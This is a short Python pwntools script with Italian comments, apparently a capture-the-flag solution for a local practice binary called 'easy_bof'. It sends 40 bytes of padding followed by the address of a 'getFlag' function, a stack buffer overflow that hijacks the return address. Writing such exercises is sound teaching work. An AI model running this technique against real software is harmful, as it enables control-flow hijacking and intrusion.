from pwn import *
# inizilizza il tuo programma
elf = ELF("./easy_bof")
# crea un file in cui prova a vedere il output
file = open("open.txt",'w')

p = process('./easy_bof')
#scrivere qui la quantità di garbage che hai trovato usando bfbuffer
x = 40
#genera il garbage lungo x
garbage = b'a' * x
#aggiunge al garbage l'indirizzo della funzione che voliamo provare ad eseguire
msg = garbage + p64(elf.symbols['getFlag'])#scrivere qui il nome della funzione che ci interessa raggiungere
#invia il garbage con la funzione
p.sendline(msg)
print(str(p.recvall()))

